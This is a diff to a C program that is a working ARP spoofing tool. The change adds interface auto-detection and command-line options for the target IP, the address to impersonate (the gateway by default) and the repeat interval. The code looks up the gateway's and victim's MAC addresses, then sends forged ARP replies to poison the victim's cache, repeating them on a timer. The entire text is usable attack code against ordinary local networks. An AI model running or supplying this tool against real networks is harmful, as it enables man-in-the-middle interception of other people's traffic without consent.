@@ -3,6 +3,8 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <errno.h>
+#include <ifaddrs.h>
+#include <getopt.h>
 
 #include <sys/socket.h>
 #include <sys/ioctl.h>
@@ -12,37 +14,56 @@
 #include <netpacket/packet.h>
 #include <netinet/if_ether.h>
 
-#define INTERFACE "enp4s0"
+char *if_name = NULL;
 
-#define PRINT_MAC(msg, addr)                             \
-	printf("%s:\t%02x:%02x:%02x:%02x:%02x:%02x\n",   \
-			(msg),                           \
-			(unsigned char) (addr)[0],       \
-			(unsigned char) (addr)[1],       \
-			(unsigned char) (addr)[2],       \
-			(unsigned char) (addr)[3],       \
-			(unsigned char) (addr)[4],       \
-			(unsigned char) (addr)[5]);
+void print_mac(const char *msg, uint8_t *addr)
+{
+	printf("%s:\t%02x:%02x:%02x:%02x:%02x:%02x\n",
+			msg,
+			(unsigned char) addr[0],
+			(unsigned char) addr[1],
+			(unsigned char) addr[2],
+			(unsigned char) addr[3],
+			(unsigned char) addr[4],
+			(unsigned char) addr[5]);
+}
 
-#define DIE(format, error)                               \
-	do {                                             \
-		fprintf(stderr, "Error: ");              \
-		fprintf(stderr, format, error);          \
-		exit(EXIT_FAILURE);                      \
-	} while (0)
+void die(const char *error)
+{
+	fprintf(stderr, "Error: %s\n", error);
+	exit(EXIT_FAILURE);
+}
+
+char *get_interface(void)
+{
+	struct ifaddrs *ifaddr, *ifa;
+	char *ret;
+	if (getifaddrs(&ifaddr) == -1) {
+		die(strerror(errno));
+	}
+
+	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+		if ((ifa->ifa_flags & IFF_UP) && !(ifa->ifa_flags & IFF_LOOPBACK)) {
+			ret = strdup(ifa->ifa_name);
+			break;
+		}
+	}
+
+	freeifaddrs(ifaddr);
+	return ret;
+}
 
 uint32_t get_gateway(void)
 {
 	uint32_t ret;
 	char buf[1024];
-	const char interface[] = INTERFACE;
 	const char seps[] = " \t";
 	FILE *f = fopen("/proc/net/route", "r");
 
-	/* hooray for ugly hacks */
+	/* believe it or not, this is the best way to do it */
 	do {
 		fgets(buf, 1024, f);
-	} while (strncmp(interface, buf, sizeof(interface) - 1));
+	} while (strncmp(if_name, buf, strlen(if_name)));
 
 	char *p = strtok(buf, seps);
 	p = strtok(NULL, seps);
@@ -51,25 +72,24 @@ uint32_t get_gateway(void)
 
 	ret = strtol(p, NULL, 16);
 
+	fclose(f);
 	return ret;
 }
 
 void request_mac(int fd, struct ether_arp *req, const char *ip_str)
 {
-	/* this is the name of my ethernet interface */
-	const char *if_name = INTERFACE;
 	struct ifreq ifr;
 	size_t if_name_len = strlen(if_name);
 	if (if_name_len < sizeof(ifr.ifr_name)) {
 		memcpy(ifr.ifr_name, if_name, if_name_len);
 		ifr.ifr_name[if_name_len] = 0;
 	} else {
-		DIE("%s\n", "interface name is too long");
+		die("Interface name is too long");
 	}
 
 	/* this gets the number of the network interface */
 	if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) {
-		DIE("%s\n", strerror(errno));
+		die(strerror(errno));
 	}
 	int ifindex = ifr.ifr_ifindex;
 
@@ -96,32 +116,50 @@ void request_mac(int fd, struct ether_arp *req, const char *ip_str)
 
 	struct in_addr ip_addr = {0};
 	if (!inet_aton(ip_str, &ip_addr)) {
-		DIE("%s\n", strerror(errno));
+		die("IP is invalid");
 	}
 	memcpy(&req->arp_tpa, &ip_addr.s_addr, sizeof(req->arp_tpa));
 
 	/* now to get our hardware address */
 	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
-		DIE("%s\n", strerror(errno));
+		die(strerror(errno));
 	}
 	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
-		DIE("%s\n", "not an ethernet interface");
+		die("Not an ethernet interface");
 	}
 	memcpy(&req->arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(req->arp_sha));
 
 	/* ...and our network address */
 	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
-		DIE("%s\n", strerror(errno));
+		die(strerror(errno));
 	}
 	memcpy(&req->arp_spa, (unsigned char *) ifr.ifr_addr.sa_data + 2, sizeof(req->arp_spa));
 
 	/* actually send it */
 	if (sendto(fd, req, sizeof(struct ether_arp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
-		DIE("%s\n", strerror(errno));
+		die(strerror(errno));
 	}
 
-	if (recv(fd, req, sizeof(struct ether_arp), 0) == -1) {
-		DIE("%s\n", strerror(errno));
+	while (1) {
+		/* can't use recvfrom() -- no network layer */
+		int len = recv(fd, req, sizeof(struct ether_arp), 0);
+		if (len == -1) {
+			die(strerror(errno));
+		}
+		if (len == 0) {   /* no response */
+			continue;
+		}
+		
+		unsigned int from_addr = (req->arp_spa[3] << 24)
+		                       + (req->arp_spa[2] << 16)
+		                       + (req->arp_spa[1] << 8)
+		                       + (req->arp_spa[0] << 0);
+		if (from_addr != ip_addr.s_addr) {
+			continue;
+		}
+
+		/* everything's good, we have our response */
+		break;
 	}
 }
 
@@ -131,21 +169,20 @@ void arp_spoof(int fd, const unsigned char *victim_mac, const char *victim_ip, u
 	struct ether_arp resp;
 	struct in_addr ip_addr = {0};
 	if (!inet_aton(victim_ip, &ip_addr)) {
-		DIE("%s\n", strerror(errno));
+		die("Victim IP is invalid");
 	}
 
-	const char *if_name = INTERFACE;
 	struct ifreq ifr;
 	size_t if_name_len = strlen(if_name);
 	if (if_name_len < sizeof(ifr.ifr_name)) {
 		memcpy(ifr.ifr_name, if_name, if_name_len);
 		ifr.ifr_name[if_name_len] = 0;
 	} else {
-		DIE("%s\n", "interface name is too long");
+		die("Interface name is too long");
 	}
 
 	if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) {
-		DIE("%s\n", strerror(errno));
+		die(strerror(errno));
 	}
 	int ifindex = ifr.ifr_ifindex;
 
@@ -163,10 +200,10 @@ void arp_spoof(int fd, const unsigned char *victim_mac, const char *victim_ip, u
 	resp.arp_op  = htons(ARPOP_REPLY);
 
 	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
-		DIE("%s\n", strerror(errno));
+		die(strerror(errno));
 	}
 	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
-		DIE("%s\n", "not an ethernet interface");
+		die("Not an ethernet interface");
 	}
 	memcpy(&resp.arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(resp.arp_sha));
 	memcpy(&resp.arp_spa, &gateway_ip, sizeof(resp.arp_spa));
@@ -174,57 +211,107 @@ void arp_spoof(int fd, const unsigned char *victim_mac, const char *victim_ip, u
 	memcpy(&resp.arp_tpa, &ip_addr.s_addr, sizeof(resp.arp_tpa));
 
 	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
-		DIE("%s\n", strerror(errno));
+		die(strerror(errno));
 	}
 }
 
 int main(int argc, char *argv[])
 {
-	if (argc < 2) {
-		DIE("%s\n", "please give an IP address to attack");
-	}
-
+	struct ether_arp req;
+	char *target_ip = NULL;
+	uint32_t spoof_ip = 0;
 	int repeat = 0;
-	if (argc > 2) {
-		repeat = strtoul(argv[2], NULL, 10);
+	int verbose = 0;
+	int spoof_gateway = 0;
+
+	/* parsing code here */
+	int c;
+	while (1) {
+		static struct option long_options[] = {
+			{ "interface", required_argument, NULL, 'i' },
+			{ "repeat",    required_argument, NULL, 'r' },
+			{ "spoof-ip",  required_argument, NULL, 's' },
+			{ "verbose",   no_argument,       NULL, 'v' },
+			{ 0,           0,                 0,     0  }
+		};
+
+		int option_index = 0;
+		struct in_addr spoof_ip_addr = {0};
+
+		c = getopt_long(argc, argv, "i:r:s:v", long_options, &option_index);
+
+		if (c == -1) {
+			break;
+		}
+
+		switch (c) {
+			case 'i':
+				if_name = strdup(optarg);
+				break;
+			case 'r':
+				repeat = strtoul(optarg, NULL, 10);
+				break;
+			case 's':
+				if (!inet_aton(optarg, &spoof_ip_addr)) {
+					die("IP to spoof is invalid");
+				}
+				spoof_ip = spoof_ip_addr.s_addr;
+				break;
+			case 'v':
+				verbose = 1;
+				break;
+			case '?':
+				break;
+			default:
+				die("Invalid option");
+				break;
+		}
 	}
 
-	int quiet = 0;
-	if (argc > 3 && !strcmp(argv[3], "-q")) {
-		quiet = 1;
+	if (argc > optind + 1) {
+		die("Too many arguments");
+	} else if (argc == optind) {
+		die("Please provide a target IP");
+	} else {
+		target_ip = argv[optind];
+	}
+
+	if (!if_name) {
+		if_name = get_interface();
+	}
+	if (!spoof_ip) {
+		spoof_ip = get_gateway();
+		spoof_gateway = 1;
 	}
 
 	/* get an ARP socket */
 	int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
 	if (fd == -1) {
-		DIE("%s\n", strerror(errno));
+		die(strerror(errno));
 	}
 
-	struct ether_arp req;
-	uint32_t gateway_ip = get_gateway();
+	if (spoof_gateway) {
+		request_mac(fd, &req, inet_ntoa((struct in_addr) { .s_addr = spoof_ip }));
+		if (verbose) {
+			print_mac("Gateway MAC address", req.arp_sha);
+		}
+	}
 
-	request_mac(fd, &req, inet_ntoa((struct in_addr) { .s_addr = gateway_ip }));
-	if (!quiet) PRINT_MAC("Gateway MAC address", req.arp_sha);
+	request_mac(fd, &req, target_ip);
+	if (verbose) {
+		print_mac("Victim MAC address", req.arp_sha);
+	}
 
-	request_mac(fd, &req, argv[1]);
-	if (!quiet) PRINT_MAC("Victim MAC address", req.arp_sha);
-
-	arp_spoof(fd, req.arp_sha, argv[1], gateway_ip);
+	arp_spoof(fd, req.arp_sha, target_ip, spoof_ip);
 
 	unsigned int count = 1;
 	while (repeat) {
-		arp_spoof(fd, req.arp_sha, argv[1], gateway_ip);
+		arp_spoof(fd, req.arp_sha, target_ip, spoof_ip);
 		sleep(repeat);
-
-		if (!quiet) {
-			printf(".");
-			if (count % 50 == 0)
-				printf("\n");
-		}
-
 		fflush(stdout);
 		++count;
 	}
 
-	return 0;
+	free(if_name);
+	return EXIT_SUCCESS;
 }
